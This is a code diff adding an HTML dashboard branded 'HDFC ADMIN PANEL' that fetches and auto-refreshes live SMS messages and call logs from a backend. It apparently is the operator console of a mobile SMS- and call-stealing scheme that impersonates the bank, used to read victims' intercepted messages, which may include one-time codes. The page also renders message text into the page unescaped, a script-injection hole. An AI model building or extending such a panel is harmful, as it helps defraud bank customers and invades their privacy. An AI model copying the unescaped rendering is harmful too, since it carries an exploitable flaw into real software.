@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HDFC ADMIN PANEL | Secure Control</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #004c8f;
+            --accent: #ed232a;
+            --bg: #0a0e14;
+            --card: #151b23;
+            --text: #e6edf3;
+            --text-dim: #8b949e;
+            --border: #30363d;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Outfit', sans-serif;
+            background-color: var(--bg);
+            color: var(--text);
+            overflow-x: hidden;
+        }
+
+        .header {
+            background-color: var(--card);
+            padding: 20px 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid var(--border);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .logo-circle {
+            width: 40px;
+            height: 40px;
+            background-color: var(--primary);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            color: white;
+            font-size: 20px;
+        }
+
+        .brand h1 {
+            font-size: 22px;
+            font-weight: 700;
+            letter-spacing: 1px;
+        }
+
+        .stats-bar {
+            display: flex;
+            gap: 30px;
+        }
+
+        .stat-item {
+            text-align: right;
+        }
+
+        .stat-value {
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--accent);
+        }
+
+        .stat-label {
+            font-size: 11px;
+            text-transform: uppercase;
+            color: var(--text-dim);
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 40px auto;
+            padding: 0 40px;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 40px;
+        }
+
+        @media (max-width: 1000px) {
+            .container { grid-template-columns: 1fr; }
+        }
+
+        .panel {
+            background-color: var(--card);
+            border-radius: 20px;
+            border: 1px solid var(--border);
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+
+        .panel-header {
+            padding: 20px 25px;
+            background-color: rgba(255,255,255,0.03);
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .panel-header h2 {
+            font-size: 18px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .btn-refresh {
+            background: none;
+            border: 1px solid var(--border);
+            color: var(--text);
+            padding: 8px 15px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 12px;
+            transition: all 0.2s;
+        }
+
+        .btn-refresh:hover {
+            background-color: var(--border);
+        }
+
+        .list-container {
+            height: 700px;
+            overflow-y: auto;
+        }
+
+        .log-item {
+            padding: 20px 25px;
+            border-bottom: 1px solid var(--border);
+            transition: background 0.2s;
+        }
+
+        .log-item:hover {
+            background-color: rgba(255,255,255,0.02);
+        }
+
+        .log-meta {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            font-size: 12px;
+        }
+
+        .log-sender {
+            font-weight: 700;
+            color: var(--primary);
+            background: rgba(0, 76, 143, 0.1);
+            padding: 2px 8px;
+            border-radius: 4px;
+        }
+
+        .log-time {
+            color: var(--text-dim);
+        }
+
+        .log-body {
+            font-size: 14px;
+            line-height: 1.5;
+            color: var(--text);
+        }
+
+        .call-type {
+            font-size: 10px;
+            text-transform: uppercase;
+            font-weight: 700;
+            padding: 2px 6px;
+            border-radius: 4px;
+            margin-right: 5px;
+        }
+
+        .type-incoming { background: rgba(76, 175, 80, 0.2); color: #4caf50; }
+        .type-outgoing { background: rgba(33, 150, 243, 0.2); color: #2196f3; }
+        .type-missed { background: rgba(244, 67, 54, 0.2); color: #f44336; }
+
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: var(--bg); }
+        ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 10px; }
+        ::-webkit-scrollbar-thumb:hover { background: var(--text-dim); }
+
+        .empty-state {
+            padding: 100px;
+            text-align: center;
+            color: var(--text-dim);
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="brand">
+            <div class="logo-circle">H</div>
+            <h1>HDFC ADMIN PANEL</h1>
+        </div>
+        <div class="stats-bar">
+            <div class="stat-item">
+                <div class="stat-value" id="totalSms">0</div>
+                <div class="stat-label">Total SMS</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-value" id="totalCalls">0</div>
+                <div class="stat-label">Total Calls</div>
+            </div>
+        </div>
+    </header>
+
+    <div class="container">
+        <!-- SMS Panel -->
+        <div class="panel">
+            <div class="panel-header">
+                <h2>💬 Live SMS Logs</h2>
+                <button class="btn-refresh" onclick="fetchData()">Refresh Data</button>
+            </div>
+            <div class="list-container" id="smsList">
+                <div class="empty-state">Loading logs...</div>
+            </div>
+        </div>
+
+        <!-- Call Log Panel -->
+        <div class="panel">
+            <div class="panel-header">
+                <h2>📞 Call History</h2>
+                <button class="btn-refresh" onclick="fetchData()">Refresh Data</button>
+            </div>
+            <div class="list-container" id="callList">
+                <div class="empty-state">Loading logs...</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        async function fetchData() {
+            try {
+                const response = await fetch('/api/admin/data');
+                const data = await response.json();
+                
+                renderSms(data.sms || []);
+                renderCalls(data.calls || []);
+                
+                document.getElementById('totalSms').textContent = data.sms?.length || 0;
+                document.getElementById('totalCalls').textContent = data.calls?.length || 0;
+            } catch (err) {
+                console.error("Fetch error:", err);
+            }
+        }
+
+        function renderSms(logs) {
+            const container = document.getElementById('smsList');
+            if (logs.length === 0) {
+                container.innerHTML = '<div class="empty-state">No SMS logs yet.</div>';
+                return;
+            }
+
+            container.innerHTML = logs.map(log => `
+                <div class="log-item">
+                    <div class="log-meta">
+                        <span class="log-sender">${log.sender}</span>
+                        <span class="log-time">${new Date(log.received_at).toLocaleString()}</span>
+                    </div>
+                    <div class="log-body">${log.message}</div>
+                </div>
+            `).join('');
+        }
+
+        function renderCalls(logs) {
+            const container = document.getElementById('callList');
+            if (logs.length === 0) {
+                container.innerHTML = '<div class="empty-state">No call logs yet.</div>';
+                return;
+            }
+
+            container.innerHTML = logs.map(log => {
+                const typeClass = log.type.toLowerCase().includes('in') ? 'type-incoming' : 
+                                  log.type.toLowerCase().includes('out') ? 'type-outgoing' : 'type-missed';
+                return `
+                    <div class="log-item">
+                        <div class="log-meta">
+                            <div>
+                                <span class="call-type ${typeClass}">${log.type}</span>
+                                <span class="log-sender">${log.number}</span>
+                            </div>
+                            <span class="log-time">${new Date(log.called_at).toLocaleString()}</span>
+                        </div>
+                        <div class="log-body">Duration: <strong>${log.duration}s</strong></div>
+                    </div>
+                `;
+            }).join('');
+        }
+
+        // Auto refresh every 30 seconds
+        fetchData();
+        setInterval(fetchData, 30000);
+    </script>
+</body>
+</html>
